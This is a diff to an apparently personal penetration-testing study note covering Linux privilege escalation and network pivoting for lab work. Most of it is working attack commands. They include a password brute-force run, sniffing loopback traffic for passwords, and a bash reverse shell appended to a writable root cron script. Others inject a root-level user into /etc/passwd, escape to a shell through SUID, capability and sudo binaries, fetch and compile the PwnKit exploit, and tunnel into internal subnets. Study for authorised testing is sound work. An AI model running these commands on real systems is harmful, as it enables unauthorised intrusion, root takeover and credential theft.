@@ -371,116 +371,261 @@ export TERM=xterm-256color
 
 ### Phase 3: Privilege Escalation
 
-#### Step 1: Quick Enumeration
+> Full technique walkthroughs: [[Linux Privilege Escalation]] (Module 18). Decision tree: [[Linux Privilege Escalation (Decision Tree)]]. Command reference: [[Linux Privilege Escalation (Command Appendix)]].
+
+#### Step 1: Manual Situational Awareness
+
+Run this checklist immediately on landing a shell. Each item is a potential privesc path on its own.
+
 ```bash
-# Current user info
+# Who am I? Which groups? (sudo, docker, lxd, disk, adm = privesc-relevant groups)
 id
-whoami
-groups
-sudo -l
 
-# System info
-uname -a
-cat /etc/issue
-cat /etc/os-release
+# OS + kernel + arch (needed for kernel exploit hunting)
+cat /etc/issue && uname -r && arch
 
-# Users
-cat /etc/passwd
-cat /etc/shadow  # if root
+# Who else has an interactive shell account?
+cat /etc/passwd | grep -v nologin | grep -v false
 
-# Network
-ip a
-netstat -tulpn
-ss -tulpn
+# Active processes (look for root-owned scripts, unusual daemons)
+ps aux
 
-# Processes
-ps auxf
-ps -eo pid,user,command
-```
+# Network (two interfaces = pivot potential; 127.0.0.1 listeners = local-only services)
+ip a && ss -anp
 
-#### Step 2: Automated Enumeration
-```bash
-# LinPEAS
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
+# Cron jobs (look for root-owned jobs calling writable scripts)
+grep "CRON" /var/log/syslog 2>/dev/null || cat /var/log/cron.log 2>/dev/null
+ls -lah /etc/cron*
 
-# Linux Smart Enumeration
-wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
-chmod +x lse.sh
-./lse.sh
-```
+# Writable files (especially /etc/passwd, cron scripts, service configs)
+find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
 
-#### Step 3: Common Privilege Escalation Vectors
-
-**SUID Binaries**:
-```bash
+# SUID binaries (anything non-standard → GTFOBins immediately)
 find / -perm -u=s -type f 2>/dev/null
 
-# Check GTFOBins for each binary
-# Example: find
-find . -exec /bin/sh -p \; -quit
+# Capabilities (cap_setuid+ep on scripting language = root)
+/usr/sbin/getcap -r / 2>/dev/null
 
-# Example: bash
-bash -p
-
-# Example: python
-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
-```
-
-**Capabilities**:
-```bash
-getcap -r / 2>/dev/null
-
-# Exploit cap_setuid
-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
-```
-
-**Sudo Misconfigurations**:
-```bash
+# Sudo permissions
 sudo -l
 
-# Common exploits:
-# git
-sudo git help config
-!/bin/bash
-
-# less
-sudo less /etc/hosts
-!/bin/bash
-
-# vim
-sudo vim
-:!/bin/bash
-
-# apt-get
-sudo apt-get changelog apt
-!/bin/sh
-
-# find
-sudo find / -exec /bin/sh \;
+# Environment variables and dotfiles (credentials left in plaintext)
+env
+cat ~/.bashrc ~/.bash_history ~/.zshrc 2>/dev/null
 ```
 
-**Cron Jobs**:
+#### Step 2: Automated Enumeration Pass
+
 ```bash
-ls -la /etc/cron*
-crontab -l
-cat /etc/crontab
+# unix-privesc-check (pre-installed on Kali, fast, low noise)
+scp /usr/bin/unix-privesc-check user@<TARGET>:~/
+./unix-privesc-check standard 2>/dev/null | grep -A 2 "WARNING"
 
-# Writable cron scripts
-find /etc/cron* -writable 2>/dev/null
+# LinPEAS (more comprehensive, colour-coded red/yellow = high confidence)
+# Download: https://github.com/carlospolop/PEASS-ng/releases
+chmod +x linpeas.sh
+./linpeas.sh 2>/dev/null | tee linpeas_output.txt
+# See [[LinPEAS]] for reading the output
 ```
 
-**/etc/passwd Writeable**:
+#### Step 3a: Credential Hunting (Module 18.2)
+
 ```bash
-openssl passwd w00t
-echo "root2:hash:0:0:root:/root:/bin/bash" >> /etc/passwd
-su root2
+# Try found credential against root immediately
+su - root
+
+# Build targeted wordlist from partial credential (e.g. Lab+3 digits)
+crunch 6 6 -t Lab%%% > wordlist.txt
+hydra -l <user> -P wordlist.txt <target_ip> -t 4 ssh -V
+
+# Sniff loopback if tcpdump is allowed via sudo
+watch -n 1 "ps -aux | grep pass"          # passively watch for cleartext in process args
+sudo tcpdump -i lo -A | grep "pass"       # catch cleartext credentials in local service traffic
 ```
 
-**Kernel Exploits**:
+#### Step 3b: Insecure File Permissions (Module 18.3)
+
+**Cron job with writable script:**
 ```bash
-uname -a
-searchsploit linux kernel <version>
-# Compile and run (test in sandbox first!)
+# Find root-owned cron job calling a writable script
+grep "CRON" /var/log/syslog | grep root   # or cat /var/log/cron.log
+ls -lah /path/to/script.sh                # look for -rwxrwxrw- or -rwxrwxrwx
+
+# Inject reverse shell (append -- never overwrite)
+echo >> /path/to/script.sh
+echo "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1" >> /path/to/script.sh
+nc -lnvp <PORT>   # wait up to one cron interval (~60 sec)
 ```
+
+**/etc/passwd world-writable:**
+```bash
+ls -lah /etc/passwd                                             # confirm -rw-rw-rw-
+openssl passwd w00t                                             # generate hash
+echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd   # inject UID 0 user
+su root2                                                        # switch: password is w00t
+```
+
+#### Step 3c: SUID + Capabilities (Module 18.4.1)
+
+```bash
+# SUID binary exploitation (GTFOBins → SUID filter)
+find / -perm -u=s -type f 2>/dev/null
+find . -exec /bin/sh -p \; -quit          # if find is SUID
+bash -p                                   # if bash is SUID
+
+# Capabilities (GTFOBins → Capabilities filter)
+/usr/sbin/getcap -r / 2>/dev/null
+# cap_setuid+ep on gdb:
+gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+# cap_setuid+ep on perl:
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+
+#### Step 3d: Sudo Abuse (Module 18.4.2)
+
+```bash
+sudo -l
+# Look up every allowed binary on GTFOBins → filter by Sudo
+# Key examples:
+sudo apt-get changelog apt    # when less opens: !/bin/sh
+sudo gcc -wrapper /bin/sh,-s .
+sudo vim -c '!sh'
+sudo find / -exec /bin/sh \; -quit
+
+# If GTFOBins technique fails with Permission denied: check AppArmor
+cat /var/log/syslog | grep apparmor   # apparmor="DENIED" = blocked, try next binary
+```
+
+#### Step 4: Kernel / SUID Binary CVEs (Module 18.4.3)
+
+```bash
+# Gather target info
+uname -r && arch
+pkexec --version       # 0.105 → PwnKit (CVE-2021-4034)
+snap --version         # snapd < 2.37.1 → dirty_sock (CVE-2019-7304)
+
+# Search on Kali
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
+
+# Always compile on the target to avoid glibc mismatch
+scp exploit.c user@<TARGET>:~/
+# on target: gcc exploit.c -o exploit && ./exploit
+
+# PwnKit (not in searchsploit -- clone from GitHub):
+git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
+scp -r /tmp/pwnkit user@<TARGET>:/tmp/pwnkit
+# on target: cd /tmp/pwnkit && gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c && gcc -Wall cve-2021-4034.c -o cve-2021-4034-local && ./cve-2021-4034-local
+```
+
+---
+
+### Phase 4: Pivoting to Adjacent Networks
+
+> Full technique walkthrough: [[Port Redirection and SSH Tunneling]] (Module 19). Decision tree: [[Port Redirection and SSH Tunneling (Decision Tree)]]. Command reference: [[Port Redirection and SSH Tunneling (Command Appendix)]].
+
+Applies when you have a shell on a host with multiple network interfaces and need to reach an adjacent subnet that Kali can't route to directly.
+
+#### Step 0: Discover internal network layout
+
+```bash
+# From the pivot shell: what subnets is this host on?
+ip addr
+ip route
+
+# Find live hosts in an adjacent subnet (bash nc sweep)
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445 2>&1; done | grep -v "timed out" | grep -v "refused"
+
+# Confirm what services are on a discovered host
+nc -zv -w 1 172.16.50.217 22 445 3389 80 443 5432
+```
+
+#### Step 1: Pick the right technique
+
+**If Kali can connect inbound to the pivot (pivot port is accessible):**
+
+```bash
+# Socat (simplest, if installed on pivot):
+socat -ddd TCP-LISTEN:2345,fork TCP:DEST_IP:DEST_PORT
+
+# SSH local port forward (one destination, pivot = SSH client):
+ssh -N -L 0.0.0.0:4455:DEST_IP:DEST_PORT user@INTERNAL_SSH_SERVER
+
+# SSH dynamic port forward (multiple destinations, pivot = SSH client):
+ssh -N -D 0.0.0.0:9999 user@INTERNAL_SSH_SERVER
+# On Kali: socks5 PIVOT_IP 9999 in /etc/proxychains4.conf
+```
+
+**If firewall blocks inbound to pivot (must SSH outbound from pivot to Kali):**
+
+```bash
+# First: start SSH server on Kali
+sudo systemctl start ssh
+
+# SSH remote port forward (one destination, pivot SSHes out to Kali):
+ssh -N -R 127.0.0.1:2345:DEST_IP:DEST_PORT kali@KALI_IP -o StrictHostKeyChecking=no
+
+# SSH remote dynamic (multiple destinations, SOCKS proxy opens on Kali):
+ssh -N -R 9998 kali@KALI_IP -o StrictHostKeyChecking=no   # OpenSSH 7.6+ client required
+# On Kali: socks5 127.0.0.1 9998 in /etc/proxychains4.conf
+```
+
+**Prerequisite when SSHing FROM a non-interactive reverse shell:**
+```bash
+# PTY upgrade first (SSH password prompt needs a real TTY):
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then add -o StrictHostKeyChecking=no (user may lack write to ~/.ssh/known_hosts)
+```
+
+**If you have a Meterpreter session on the pivot (no SSH needed):**
+
+```bash
+# In msfconsole after catching the session:
+bg
+use auxiliary/server/socks_proxy
+set SRVPORT 9050; set SRVHOST 0.0.0.0; set VERSION 4a
+run
+
+sessions -i 1
+run autoroute -s <target-subnet>/<mask>
+```
+
+Then on Kali: `socks4 127.0.0.1 9050` in `/etc/proxychains4.conf`, and `proxychains` prefix your tools as normal.
+No SSH server needed on the pivot, no credentials needed: the Meterpreter channel itself carries the traffic.
+
+**Protocol-restricted environments (egress filtered):**
+
+| Allowed egress | Technique | Tool |
+|---|---|---|
+| HTTP/HTTPS only | HTTP-tunneled SOCKS | Rpivot or Chisel (forward or reverse) |
+| DNS only | DNS tunneling | Dnscat2 |
+| ICMP only | ICMP-tunneled TCP | ptunnel-ng |
+| RDP only (Windows) | SOCKS over RDP channel | SocksOverRDP + Proxifier |
+
+→ Full syntax for each: [[Port Redirection and SSH Tunneling (Command Appendix)]]
+
+#### Step 2: Route tools through the pivot
+
+**Via proxychains (SOCKS-based techniques):**
+```bash
+proxychains nmap -vvv -sT -Pn -n DEST_IP        # -sT mandatory (not -sS), -Pn and -n mandatory
+proxychains smbclient -L //172.16.50.217/ -U user --password=pass
+proxychains ssh user@INTERNAL_HOST
+```
+
+**Via sshuttle (transparent routing, no proxychains prefix needed):**
+```bash
+# Requires root on Kali + Python3 on pivot
+sshuttle -r user@PIVOT_IP:PIVOT_PORT SUBNET/24 SUBNET2/24
+# After: connect to internal hosts directly, no proxychains prefix
+```
+
+#### Step 3: Clean up and restore proxychains
+
+```bash
+# Reset /etc/proxychains4.conf after each lab/engagement:
+sudo tail -3 /etc/proxychains4.conf            # check current entry before editing
+sudo sed -i 's/socks5 .*/socks4 127.0.0.1 9050/' /etc/proxychains4.conf
+# If the sed pattern doesn't match (entry format has drifted), edit manually
+```
+
+#### Tags: #Pivoting #PortForwarding #SSHTunneling #Proxychains #Meterpreter #Rpivot #Dnscat2 #ptunnel-ng #SocksOverRDP #Module19 #HTBSupplementary
